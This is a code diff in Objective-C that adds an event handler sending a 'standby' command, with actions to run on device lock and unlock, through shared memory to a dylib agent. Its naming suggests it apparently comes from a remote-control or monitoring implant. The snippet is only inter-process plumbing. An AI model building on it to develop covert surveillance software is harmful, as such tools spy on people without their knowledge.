@@ -18,6 +18,7 @@
 #import "RCSIEvents.h"
 #import "RCSICommon.h"
 #import "RCSITaskManager.h"
+#import "RCSISharedMemory.h"
 
 //#define DEBUG
 
@@ -73,7 +74,7 @@ typedef struct _batteryLevel {
   u_int maxLevel;
 } batteryLevelStruct;
 
-
+extern RCSISharedMemory *mSharedMemoryCommand;
 static RCSIEvents *sharedEvents = nil;
 static BOOL wifiFound = FALSE;
 static BOOL gprsFound = FALSE;
@@ -752,6 +753,58 @@ NSLock *connectionLock;
     }
   
   [configuration release];
+  [outerPool release];
+}
+
+- (void)eventStandBy: (NSDictionary *)configuration
+{
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+
+  NSMutableData *standByCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+  
+  shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[standByCommand bytes];
+  shMemoryHeader->agentID         = OFFT_STANDBY;
+  shMemoryHeader->direction       = D_TO_AGENT;
+  shMemoryHeader->command         = AG_START;
+  shMemoryHeader->commandDataSize = sizeof(standByStruct);
+  
+#ifdef DEBUG
+  NSLog(@"%s: configuration %@", __FUNCTION__, configuration);
+#endif
+  
+  standByStruct tmpStruct;
+  
+  tmpStruct.actionOnLock    = [[configuration objectForKey: @"actionID"] intValue];
+  
+  if ([configuration objectForKey: @"data"])
+    memcpy(&tmpStruct.actionOnUnlock, [[configuration objectForKey: @"data"] bytes], sizeof(UInt32));
+  else
+    tmpStruct.actionOnUnlock = CONF_ACTION_NULL;
+  
+  memcpy(shMemoryHeader->commandData, &tmpStruct, sizeof(tmpStruct));
+  
+#ifdef DEBUG
+  NSLog(@"%s: sending standby command to dylib with actionLock %lu, actionUnlock %lu",
+        __FUNCTION__, tmpStruct.actionOnLock, tmpStruct.actionOnUnlock);
+#endif
+  
+  if ([mSharedMemoryCommand writeMemory: standByCommand
+                                 offset: OFFT_STANDBY
+                          fromComponent: COMP_CORE])
+  {
+#ifdef DEBUG
+    NSLog(@"%s: sending standby command to dylib: done!", __FUNCTION__);
+#endif
+  }
+  else 
+  {
+#ifdef DEBUG
+    NSLog(@"%s: sending standby command to dylib: error!", __FUNCTION__);
+#endif
+  }
+  
+  [standByCommand release]; 
+
   [outerPool release];
 }
 
